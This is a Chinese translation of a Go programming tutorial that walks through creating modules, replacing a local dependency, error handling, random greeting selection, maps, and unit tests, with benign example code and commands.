\u5c06\u683c\u5f0f\u5316\u7684\u95ee\u5019\u8bed\u6587\u672c\u8fd4\u56de\u7ed9\u547c\u53eb\u8005\u3002 \u5728\u53e6\u4e00\u4e2a\u6a21\u5757\u4e2d\u8c03\u7528\u4ee3\u7801 \uf0c1 \u4e3a Go \u6a21\u5757\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 hello \uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u5199\u8c03\u7528\u8005\u7684\u4ee3\u7801\u3002 cd .. mkdir hello cd hello \u76ee\u5f55\u7ed3\u6784\u5982\u4e0b: <home>/ |-- greetings/ |-- hello/ \u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a \u8fd0\u884c go mod init \uff0c\u4e3a\u6a21\u5757\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a $ go mod init example.com/hello go: creating new go.mod: module example.com/hello \u521b\u5efa\u4ee3\u7801\u6587\u4ef6 hello.go \u5e76\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801 package main import ( \"fmt\" \"example.com/greetings\" ) func main() { // Get a greeting message and print it. message := greetings.Hello(\"Gladys\") fmt.Println(message) } \u5728\u6b64\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8: - \u58f0\u660e\u4e00\u4e2a main \u5305\u3002\u5728Go\u4e2d\uff0c\u4f5c\u4e3a\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u7684\u4ee3\u7801\u5fc5\u987b\u5728 main \u5305\u4e2d\u3002 - \u5bfc\u5165\u4e24\u4e2a\u5305 example.com/greetings \u548c fmt \u3002\u8fd9\u4f7f\u5f97\u60a8\u7684\u4ee3\u7801\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u5305\u7684\u51fd\u6570\u3002\u5bfc\u5165 example.com/greetings \uff08\u60a8\u4e4b\u524d\u521b\u5efa\u7684\u6a21\u5757\u4e2d\u7684\u5305\uff09 \u4f7f\u60a8\u53ef\u4ee5\u8bbf\u95ee Hello \u51fd\u6570\u3002\u5bfc\u5165 fmt \uff0c\u5177\u6709\u5904\u7406\u8f93\u5165\u548c\u8f93\u51fa\u6587\u672c\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u5c06\u6587\u672c\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002 \u7f16\u8f91 example.com/hello \u6a21\u5757\u4ee5\u4f7f\u7528\u60a8\u7684\u672c\u5730 example.com/greetings \u6a21\u5757\u3002 \u5bf9\u4e8e\u751f\u4ea7\u7528\u9014\uff0c\u60a8\u5c06 example.com/greetings \u4ece\u5176\u5b58\u50a8\u5e93\u53d1\u5e03\u6a21\u5757\uff08\u4f7f\u7528\u53cd\u6620\u5176\u53d1\u5e03\u4f4d\u7f6e\u7684\u6a21\u5757\u8def\u5f84\uff09\uff0cGo \u5de5\u5177\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230\u5b83\u5e76\u4e0b\u8f7d\u5b83\u3002\u76ee\u524d\uff0c\u7531\u4e8e\u60a8\u5c1a\u672a\u53d1\u5e03\u8be5\u6a21\u5757\uff0c\u60a8\u9700\u8981\u8c03\u6574\u8be5 example.com/hello \u6a21\u5757\uff0c\u4ee5\u4fbf\u5b83\u53ef\u4ee5\u5728\u60a8\u7684\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e0a\u627e\u5230 example.com/greetings \u4ee3\u7801\u3002 \u4e3a\u6b64\uff0c\u8bf7\u4f7f\u7528 go mod edit command \u547d\u4ee4\u7f16\u8f91 example.com/hello \u6a21\u5757\u4ee5\u5c06 Go \u5de5\u5177\u4ece\u5176\u6a21\u5757\u8def\u5f84\uff08\u6a21\u5757\u6240\u5728\u7684\u4f4d\u7f6e\uff09\u91cd\u5b9a\u5411\u5230\u672c\u5730\u76ee\u5f55\uff08\u6a21\u5757\u6240\u5728\u7684\u4f4d\u7f6e\uff09\u3002 \u5728 hello \u76ee\u5f55\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4: $ go mod edit -replace example.com/greetings=../greetings \u8be5\u547d\u4ee4\u6307\u5b9a example.com/greetings \u5e94\u66ff\u6362 ../greetings \u4f5c\u4e3a\u4f9d\u8d56\u9879\u7684\u5b9a\u4f4d\u3002\u8fd0\u884c\u547d\u4ee4\u540e\uff0c hello \u76ee\u5f55\u4e2d\u7684 go.mod \u6587\u4ef6\u5e94\u8be5\u5305\u542b\u4e00\u4e2a replace \u6307\u4ee4 \uff1a module example.com/hello go 1.16 replace example.com/greetings => ../greetings \u5728 hello \u76ee\u5f55\u4e2d\u4e0b\uff0c\u8fd0\u884c go mod tidy \u547d\u4ee4\u540c\u6b65\u6a21\u5757 example.com/hello \u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6dfb\u52a0\u4ee3\u7801\u6240\u9700\u4f46\u5c1a\u672a\u5728\u6a21\u5757\u4e2d\u8ddf\u8e2a\u7684\u90a3\u4e9b\u3002 $ go mod tidy go: found example.com/greetings in example.com/greetings v0.0.0-00010101000000-000000000000 \u547d\u4ee4\u5b8c\u6210\u540e\uff0c example.com/hello \u6a21\u5757\u7684 go.mod \u6587\u4ef6\u5e94\u5982\u4e0b\u6240\u793a\uff1a module example.com/hello go 1.16 replace example.com/greetings => ../greetings require example.com/greetings v0.0.0-00010101000000-000000000000 \u8be5\u547d\u4ee4\u5728 greetings \u76ee\u5f55\u4e2d\u627e\u5230\u4e86\u672c\u5730\u4ee3\u7801\uff0c\u7136\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a require \u6307\u4ee4 \u6765\u6307\u5b9a example.com/hello \u4f9d\u8d56 example.com/greetings \u3002\u60a8\u5728 hello.go \u4e2d\u5bfc\u5165 greetings \u5305\u65f6\u521b\u5efa\u4e86\u6b64\u4f9d\u8d56\u9879\u3002 \u6a21\u5757\u8def\u5f84\u540e\u9762\u7684\u6570\u5b57\u662f\u4e00\u4e2a \u4f2a\u7248\u672c\u53f7 \u2014\u2014\u4e00\u4e2a\u751f\u6210\u7684\u6570\u5b57\u7528\u6765\u4ee3\u66ff\u8bed\u4e49\u7248\u672c\u53f7\uff08\u6a21\u5757\u8fd8\u6ca1\u6709\uff09\u3002 \u8981\u5f15\u7528 \u5df2\u53d1\u5e03 \u7684\u6a21\u5757\uff0cgo.mod \u6587\u4ef6\u901a\u5e38\u4f1a\u7701\u7565 replace \u6307\u4ee4\u5e76\u4f7f\u7528 require \u672b\u5c3e\u5e26\u6709\u6807\u8bb0\u7248\u672c\u53f7\u7684\u6307\u4ee4\u3002 require example.com/greetings v1.1.0 \u5728 hello \u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c\u4ee3\u7801\u4ee5\u786e\u8ba4\u5176\u5de5\u4f5c\u3002 $ go run . Hi, Gladys. Welcome! \u8fd4\u56de\u5e76\u5904\u7406\u9519\u8bef \uf0c1 \u5904\u7406\u9519\u8bef\u662f\u53ef\u9760\u4ee3\u7801\u7684\u57fa\u672c\u7279\u5f81\u3002\u5728\u4e0b\u9762\u7684\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\u4ee5\u4ecegreetings\u6a21\u5757\u8fd4\u56de\u9519\u8bef\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u4e2d\u5904\u7406\u5b83\u3002 \u4fee\u6539 greetings/greetings.go \u5982\u4e0b\u4ee3\u7801\u3002 \u5982\u679c\u60a8\u4e0d\u77e5\u9053\u8be5\u95ee\u5019\u8c01\uff0c\u90a3\u4e48\u53d1\u9001\u95ee\u5019\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002\u5982\u679c\u540d\u79f0\u4e3a\u7a7a\uff0c\u5219\u5411\u8c03\u7528\u8005\u8fd4\u56de\u9519\u8bef\u3002\u5c06\u4ee5\u4e0b\u4ee3\u7801\u590d\u5236\u5230 greetings.go \u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import ( \"errors\" \"fmt\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return \"\", errors.New(\"empty name\") } // If a name was received, return a value that embeds the name // in a greeting message. message := fmt.Sprintf(\"Hi, %v. Welcome!\", name) return message, nil } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u66f4\u6539\u51fd\u6570\uff0c\u4f7f\u5176\u8fd4\u56de\u4e24\u4e2a\u503c\uff1a \u4e00\u4e2a string \u548c\u4e00\u4e2a error \u3002\u60a8\u7684\u8c03\u7528\u8005\u5c06\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\u4ee5\u67e5\u770b\u662f\u5426\u53d1\u751f\u9519\u8bef\u3002\uff08\u4efb\u4f55 Go \u51fd\u6570\u90fd\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u3002\uff09 \u5bfc\u5165 Go \u6807\u51c6\u5e93 errors \u5305\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u7684 errors.New \u51fd\u6570 \u3002 \u6dfb\u52a0\u4e00\u6761 if \u8bed\u53e5\u4ee5\u68c0\u67e5\u65e0\u6548\u8bf7\u6c42\uff08\u540d\u79f0\u5e94\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\u5e76\u5728\u8bf7\u6c42\u65e0\u6548\u65f6\u8fd4\u56de\u9519\u8bef\u3002\u8be5 errors.New \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a error \u5185\u90e8\u5e26\u6709\u60a8\u7684\u6d88\u606f\u3002 \u6dfb\u52a0 nil \uff08\u610f\u5473\u7740\u6ca1\u6709\u9519\u8bef\uff09\u4f5c\u4e3a\u6210\u529f\u8fd4\u56de\u7684\u7b2c\u4e8c\u4e2a\u503c\u3002\u8fd9\u6837\uff0c\u8c03\u7528\u8005\u5c31\u53ef\u4ee5\u770b\u5230\u51fd\u6570\u6210\u529f\u4e86\u3002 \u5728 hello/hello.go \u6587\u4ef6\u4e2d\uff0c\u5904\u7406 Hello \u51fd\u6570\u73b0\u5728\u8fd4\u56de\u7684\u9519\u8bef\u4ee5\u53ca\u975e\u9519\u8bef\u503c\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // Request a greeting message. message, err := greetings.Hello(\"\") // If an error was returned, print it to the console and // exit the program. if err != nil { log.Fatal(err) } // If no error was returned, print the returned message // to the console. fmt.Println(message) } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 log \u5305 \u914d\u7f6e\u4e3a\u5728\u5176\u65e5\u5fd7\u6d88\u606f\u7684\u5f00\u5934\u6253\u5370\u547d\u4ee4\u540d\u79f0\uff08\u201cgreetings:\u201d\uff09\uff0c\u4e0d\u5e26\u65f6\u95f4\u6233\u6216\u6e90\u6587\u4ef6\u4fe1\u606f\u3002 \u5c06 Hello \u7684\u4e24\u4e2a\u8fd4\u56de\u503c\uff08\u5305\u62ec error\uff09\u5206\u914d\u7ed9\u53d8\u91cf\u3002 \u5c06 Hello \u7684\u53c2\u6570\u4ece Gladys \u7684\u540d\u5b57\u66f4\u6539\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u4ee5\u4fbf\u60a8\u53ef\u4ee5\u5c1d\u8bd5\u9519\u8bef\u5904\u7406\u4ee3\u7801\u3002 \u5bfb\u627e\u4e00\u4e2a\u975e nil \u7684 error \u503c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7ee7\u7eed\u4e0b\u53bb\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002 \u4f7f\u7528\u6807\u51c6\u5e93\u4e2d\u7684\u51fd\u6570 log package \u6765\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002\u5982\u679c\u51fa\u73b0\u9519\u8bef\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 log \u5305\u7684 Fatal \u51fd\u6570 \u6765\u6253\u5370\u9519\u8bef\u5e76\u505c\u6b62\u7a0b\u5e8f\u3002 \u5728 hello \u76ee\u5f55\u8fd0\u884c hello.go \u4ee5\u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u73b0\u5728\u4f60\u4f20\u5165\u4e00\u4e2a\u7a7a\u540d\u79f0\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u3002 $ go run . greetings: empty name exit status 1 \u8fd4\u56de\u968f\u5373\u95ee\u5019\u8bed \uf0c1 \u60a8\u5c06\u6dfb\u52a0\u4e00\u4e2a\u5c0f\u7247\u6bb5\u4ee5\u5305\u542b\u4e09\u6761\u95ee\u5019\u6d88\u606f\uff0c\u7136\u540e\u8ba9\u60a8\u7684\u4ee3\u7801\u968f\u673a\u8fd4\u56de\u5176\u4e2d\u4e00\u6761\u6d88\u606f\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u4f7f\u7528 Go slice(\u5207\u7247)\u3002\u5207\u7247\u5c31\u50cf\u4e00\u4e2a\u6570\u7ec4\uff0c\u53ea\u662f\u5b83\u7684\u5927\u5c0f\u4f1a\u968f\u7740\u60a8\u6dfb\u52a0\u548c\u5220\u9664\u9879\u76ee\u800c\u52a8\u6001\u53d8\u5316\u3002\u5207\u7247\u662f Go \u6700\u6709\u7528\u7684\u7c7b\u578b\u4e4b\u4e00\u3002 \u6709\u5173\u5207\u7247\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go \u535a\u5ba2\u4e2d\u7684 Go slices \u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 package greetings import ( \"errors\" \"fmt\" \"math/rand\" \"time\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. message := fmt.Sprintf(randomFormat(), name) return message, nil } // init sets initial values for variables used in the function. func init() { rand.Seed(time.Now().UnixNano()) } // randomFormat returns one of a set of greeting messages. The returned // message is selected at random. func randomFormat() string { // A slice of message formats. formats := []string{ \"Hi, %v. Welcome!\", \"Great to see you, %v!\", \"Hail, %v! Well met!\", } // Return a randomly selected message format by specifying // a random index for the slice of formats. return formats[rand.Intn(len(formats))] } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u6dfb\u52a0\u4e00\u4e2a randomFormat \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u968f\u673a\u9009\u62e9\u7684\u95ee\u5019\u6d88\u606f\u683c\u5f0f\u3002\u8bf7\u6ce8\u610f\uff0c randomFormat \u4ee5\u5c0f\u5199\u5b57\u6bcd\u5f00\u5934\uff0c\u4f7f\u5176\u53ea\u80fd\u88ab\u5176\u81ea\u5df1\u7684\u5305\u4e2d\u7684\u4ee3\u7801\u8bbf\u95ee\uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u4e0d\u4f1a\u88ab\u5bfc\u51fa\uff09\u3002 \u5728 randomFormat \u4e2d\uff0c\u58f0\u660e formats \u5177\u6709\u4e09\u79cd\u6d88\u606f\u683c\u5f0f\u7684\u5207\u7247\u3002\u58f0\u660e\u5207\u7247\u65f6\uff0c\u5728\u62ec\u53f7\u4e2d\u7701\u7565\u5176\u5927\u5c0f\uff0c\u5982\u4e0b\u6240\u793a\uff1a []string . \u8fd9\u544a\u8bc9 Go\uff0c\u5207\u7247\u5e95\u5c42\u6570\u7ec4\u7684\u5927\u5c0f\u53ef\u4ee5\u52a8\u6001\u66f4\u6539\u3002 \u4f7f\u7528 math/rand \u5305 \u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u7528\u4e8e\u4ece\u5207\u7247\u4e2d\u9009\u62e9\u4e00\u4e2a\u9879\u76ee\u3002 \u6dfb\u52a0\u4e00\u4e2a init \u51fd\u6570\u4ee5\u4f7f\u7528\u5f53\u524d\u65f6\u95f4\u4e3a rand \u5305\u7684\u968f\u673a\u6570\u79cd\u5b50(seed)\u3002Go\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c init \u51fd\u6570\uff0c\u5728\u5168\u5c40\u53d8\u91cf\u88ab\u521d\u59cb\u5316\u4e4b\u540e\u3002\u6709\u5173 init \u51fd\u6570\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u3002 \u5728 Hello \u4e2d\uff0c\u8c03\u7528 randomFormat \u51fd\u6570\u4ee5\u83b7\u53d6\u60a8\u5c06\u8fd4\u56de\u7684\u6d88\u606f\u7684\u683c\u5f0f\uff0c\u7136\u540e\u5c06\u683c\u5f0f\u548c name \u503c\u4e00\u8d77\u4f7f\u7528\u6765\u521b\u5efa\u6d88\u606f\u3002 \u50cf\u4ee5\u524d\u4e00\u6837\u8fd4\u56de\u6d88\u606f\uff08\u6216\u9519\u8bef\uff09\u3002 \u5728 hello/hello.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 \u53ea\u9700\u5c06 Gladys \u7684\u540d\u5b57\uff08\u6216\u5176\u4ed6\u540d\u5b57\uff0c\u5982\u679c\u60a8\u613f\u610f\u7684\u8bdd\uff09\u4f5c\u4e3a\u53c2\u6570\u6dfb\u52a0\u5230 hello.go \u4e2d\u7684 Hello \u51fd\u6570\u8c03\u7528\u4e2d\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // Request a greeting message. message, err := greetings.Hello(\"Gladys\") // If an error was returned, print it to the console and // exit the program. if err != nil { log.Fatal(err) } // If no error was returned, print the returned message // to the console. fmt.Println(message) } \u8fd0\u884c hello.go \u4ee5\u786e\u8ba4\u4ee3\u7801\u6b63\u5e38\u8fd0\u884c\u3002\u591a\u6b21\u8fd0\u884c\u5b83\uff0c\u6ce8\u610f\u95ee\u5019\u8bed\u53d1\u751f\u4e86\u53d8\u5316\u3002 $ go run . Great to see you, Gladys! $ go run . Hi, Gladys. Welcome! $ go run . Hail, Gladys! Well met! \u56de\u590d\u591a\u4eba\u95ee\u5019 \uf0c1 \u6dfb\u52a0\u5bf9\u5728\u4e00\u4e2a\u8bf7\u6c42\u4e2d\u83b7\u53d6\u591a\u4e2a\u4eba\u7684\u95ee\u5019\u7684\u652f\u6301\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5904\u7406\u591a\u503c\u8f93\u5165\uff0c\u7136\u540e\u5c06\u8be5\u8f93\u5165\u4e2d\u7684\u503c\u4e0e\u591a\u503c\u8f93\u51fa\u914d\u5bf9\u3002\u4e3a\u6b64\uff0c\u60a8\u9700\u8981\u5c06\u4e00\u7ec4\u540d\u79f0\u4f20\u9012\u7ed9\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u540d\u79f0\u8fd4\u56de\u4e00\u4e2a\u95ee\u5019\u8bed\u3002 \u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\u3002\u5c06 Hello \u51fd\u6570\u7684\u53c2\u6570\u4ece\u5355\u4e2a\u540d\u79f0\u66f4\u6539\u4e3a\u4e00\u7ec4\u540d\u79f0\u4f1a\u66f4\u6539\u51fd\u6570\u7684\u7b7e\u540d\u3002\u5982\u679c\u60a8\u5df2\u7ecf\u53d1\u5e03\u4e86 example.com/greetings \u6a21\u5757\u5e76\u4e14\u7528\u6237\u5df2\u7ecf\u7f16\u5199\u4e86\u4ee3\u7801\u8c03\u7528 Hello \uff0c\u90a3\u4e48\u8be5\u66f4\u6539\u5c06\u7834\u574f\u4ed6\u4eec\u7684\u7a0b\u5e8f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u66f4\u597d\u7684\u9009\u62e9\u662f\u7f16\u5199\u4e00\u4e2a\u5177\u6709\u4e0d\u540c\u540d\u79f0\u7684\u65b0\u51fd\u6570\u3002\u65b0\u51fd\u6570\u5c06\u91c7\u7528\u591a\u4e2a\u53c2\u6570\u3002\u8fd9\u4fdd\u7559\u4e86\u65e7\u529f\u80fd\u4ee5\u5b9e\u73b0\u5411\u540e\u517c\u5bb9\u6027\u3002 \u5728 greetings/greetings.go \u4e2d\uff0c\u66f4\u6539\u60a8\u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u5982\u4e0b\u6240\u793a\u3002 package greetings import ( \"errors\" \"fmt\" \"math/rand\" \"time\" ) // Hello returns a greeting for the named person. func Hello(name string) (string, error) { // If no name was given, return an error with a message. if name == \"\" { return name, errors.New(\"empty name\") } // Create a message using a random format. message := fmt.Sprintf(randomFormat(), name) return message, nil } // Hellos returns a map that associates each of the named people // with a greeting message. func Hellos(names []string) (map[string]string, error) { // A map to associate names with messages. messages := make(map[string]string) // Loop through the received slice of names, calling // the Hello function to get a message for each name. for _, name := range names { message, err := Hello(name) if err != nil { return nil, err } // In the map, associate the retrieved message with // the name. messages[name] = message } return messages, nil } // Init sets initial values for variables used in the function. func init() { rand.Seed(time.Now().UnixNano()) } // randomFormat returns one of a set of greeting messages. The returned // message is selected at random. func randomFormat() string { // A slice of message formats. formats := []string{ \"Hi, %v. Welcome!\", \"Great to see you, %v!\", \"Hail, %v! Well met!\", } // Return one of the message formats selected at random. return formats[rand.Intn(len(formats))] } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u6dfb\u52a0\u4e00\u4e2a Hellos \u51fd\u6570\uff0c\u5176\u53c2\u6570\u662f\u540d\u79f0\u5207\u7247\u800c\u4e0d\u662f\u5355\u4e2a\u540d\u79f0\u3002\u6b64\u5916\uff0c\u60a8\u5c06\u5176\u8fd4\u56de\u7c7b\u578b\u4e4b\u4e00\u4ece\u4e00\u4e2a string \u66f4\u6539\u4e3a\u4e00\u4e2a map \u4ee5\u4fbf\u60a8\u53ef\u4ee5\u8fd4\u56de\u6620\u5c04\u5230\u95ee\u5019\u6d88\u606f\u7684\u540d\u79f0\u3002 \u8ba9\u65b0 Hellos \u51fd\u6570\u8c03\u7528\u73b0\u6709 Hello \u51fd\u6570\u3002\u8fd9\u6709\u52a9\u4e8e\u51cf\u5c11\u91cd\u590d\uff0c\u540c\u65f6\u4e5f\u4fdd\u7559\u8fd9\u4e24\u4e2a\u529f\u80fd\u3002 \u521b\u5efa\u4e00\u4e2a messages map \u6620\u5c04\u4ee5\u5c06\u6bcf\u4e2a\u63a5\u6536\u5230\u7684\u540d\u79f0\uff08\u4f5c\u4e3a\u952e\uff09\u4e0e\u751f\u6210\u7684\u6d88\u606f\uff08\u4f5c\u4e3a\u503c\uff09\u76f8\u5173\u8054\u3002\u5728 Go \u4e2d\uff0c\u60a8\u4f7f\u7528\u4ee5\u4e0b\u8bed\u6cd5\u521d\u59cb\u5316map\uff1a make(map[key-type]value-type) . \u60a8\u6709\u51fd\u6570 Hellos \u5c06\u6b64\u6620\u5c04\u8fd4\u56de\u7ed9\u8c03\u7528\u8005\u3002\u6709\u5173map\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Go \u535a\u5ba2\u4e0a\u7684 Go maps in action \u3002 \u904d\u5386\u60a8\u7684\u51fd\u6570\u6536\u5230\u7684\u540d\u79f0\uff0c\u68c0\u67e5\u6bcf\u4e2a\u540d\u79f0\u662f\u5426\u5177\u6709\u975e\u7a7a\u503c\uff0c\u7136\u540e\u5c06\u4e00\u6761\u6d88\u606f\u4e0e\u6bcf\u4e2a\u5173\u8054\u3002\u5728\u8fd9\u4e2a for \u5faa\u73af\u4e2d\uff0c range \u8fd4\u56de\u4e24\u4e2a\u503c\uff1a\u5faa\u73af\u4e2d\u5f53\u524d\u9879\u76ee\u7684\u7d22\u5f15\u548c\u9879\u76ee\u503c\u7684\u526f\u672c\u3002\u60a8\u4e0d\u9700\u8981\u7d22\u5f15\uff0c\u56e0\u6b64\u60a8\u4f7f\u7528 Go \u7a7a\u767d\u6807\u8bc6\u7b26\uff08\u4e0b\u5212\u7ebf\uff09\u6765\u5ffd\u7565\u5b83\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Effective Go \u4e2d\u7684 \u7a7a\u767d\u6807\u8bc6\u7b26 \u3002 \u5728\u60a8\u7684 hello/hello.go \u8c03\u7528\u4ee3\u7801\u4e2d\uff0c\u4f20\u9012\u4e00\u6bb5\u540d\u79f0\uff0c\u7136\u540e\u6253\u5370\u60a8\u8fd4\u56de\u7684\u540d\u79f0/\u6d88\u606f\u6620\u5c04\u7684\u5185\u5bb9\u3002 package main import ( \"fmt\" \"log\" \"example.com/greetings\" ) func main() { // Set properties of the predefined Logger, including // the log entry prefix and a flag to disable printing // the time, source file, and line number. log.SetPrefix(\"greetings: \") log.SetFlags(0) // A slice of names. names := []string{\"Gladys\", \"Samantha\", \"Darrin\"} // Request greeting messages for the names. messages, err := greetings.Hellos(names) if err != nil { log.Fatal(err) } // If no error was returned, print the returned map of // messages to the console. fmt.Println(messages) } \u901a\u8fc7\u8fd9\u4e9b\u66f4\u6539\uff0c\u60a8\u53ef\u4ee5\uff1a \u521b\u5efa\u4e00\u4e2a names \u53d8\u91cf\u4f5c\u4e3a\u5305\u542b\u4e09\u4e2a\u540d\u79f0\u7684\u5207\u7247\u7c7b\u578b\u3002 \u5c06 names \u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 Hellos \u51fd\u6570\u3002 \u5207\u6362\u5230\u5305\u542b hello/hello.go \u7684\u76ee\u5f55\uff0c\u7136\u540e\u4f7f\u7528 go run \u786e\u8ba4\u4ee3\u7801\u6709\u6548\u3002 \u8f93\u51fa\u5e94\u8be5\u662f\u5730\u56fe\u7684\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\uff0c\u5c06\u540d\u79f0\u4e0e\u6d88\u606f\u76f8\u5173\u8054\uff0c\u5982\u4e0b\u6240\u793a\uff1a $ go run . map[Darrin:Hail, Darrin! Well met! Gladys:Hi, Gladys. Welcome! Samantha:Hail, Samantha! Well met!] \u672c\u4e3b\u9898\u4ecb\u7ecd\u4e86\u7528\u6237\u8868\u793a\u540d\u79f0/\u503c\u5bf9\u7684map\u6620\u5c04\u3002\u5b83\u8fd8\u5f15\u5165\u4e86\u901a\u8fc7\u4e3a\u6a21\u5757\u4e2d\u589e\u52a0\u65b0\u51fd\u6570\u6216\u66f4\u6539\u51fd\u6570\u5b9e\u73b0\u65b0\u529f\u80fd\u6765\u4fdd\u6301\u5411\u540e\u517c\u5bb9\u6027\u7684\u60f3\u6cd5\u3002\u6709\u5173\u5411\u540e\u517c\u5bb9\u6027\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u4fdd\u6301\u6a21\u5757\u517c\u5bb9 \u3002 \u6dfb\u52a0\u6d4b\u8bd5 \uf0c1 \u73b0\u5728\u60a8\u5df2\u7ecf\u5c06\u4ee3\u7801\u653e\u5230\u4e86\u4e00\u4e2a\u7a33\u5b9a\u7684\u5730\u65b9\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6d4b\u8bd5\uff0c\u5728\u5f00\u53d1\u671f\u95f4\u6d4b\u8bd5\u60a8\u7684\u4ee3\u7801\u53ef\u80fd\u4f1a\u66b4\u9732\u5728\u60a8\u8fdb\u884c\u66f4\u6539\u65f6\u53d1\u73b0\u7684\u9519\u8bef\u3002 Go \u5bf9\u5355\u5143\u6d4b\u8bd5\u7684\u5185\u7f6e\u652f\u6301\u4f7f\u60a8\u53ef\u4ee5\u66f4\u8f7b\u677e\u5730\u8fdb\u884c\u6d4b\u8bd5\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4f7f\u7528\u547d\u540d\u7ea6\u5b9a\u3001Go \u7684 testing \u5305\u548c go test \u547d\u4ee4\uff0c\u60a8\u53ef\u4ee5\u5feb\u901f\u7f16\u5199\u548c\u6267\u884c\u6d4b\u8bd5\u3002 \u5728 greetings \u76ee\u5f55\u4e2d\uff0c\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a greetings_test.go \u7684\u6587\u4ef6\u3002 \u4ee5 _test.go \u7ed3\u5c3e\u7684\u6587\u4ef6\u540d\u544a\u8bc9 go test \u547d\u4ee4\u8be5\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5\u51fd\u6570\u3002 \u5728 greetings_test.go \u4e2d\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u5e76\u4fdd\u5b58\u6587\u4ef6\u3002 package greetings import ( \"testing\" \"regexp\" ) // TestHelloName calls greetings.Hello with a name, checking // for a valid return value. func TestHelloName(t *testing.T) { name := \"Gladys\" want := regexp.MustCompile(`\\b`+name+`\\b`) msg, err := Hello(\"Gladys\") if !want.MatchString(msg) || err != nil { t.Fatalf(`Hello(\"Gladys\") = %q, %v, want match for %#q, nil`, msg, err, want) } } // TestHelloEmpty calls greetings.Hello with an empty string, // checking for an error. func TestHelloEmpty(t *testing.T) { msg, err := Hello(\"\") if msg != \"\" || err == nil { t.Fatalf(`Hello(\"\") = %q, %v, want \"\", error`, msg, err) } } 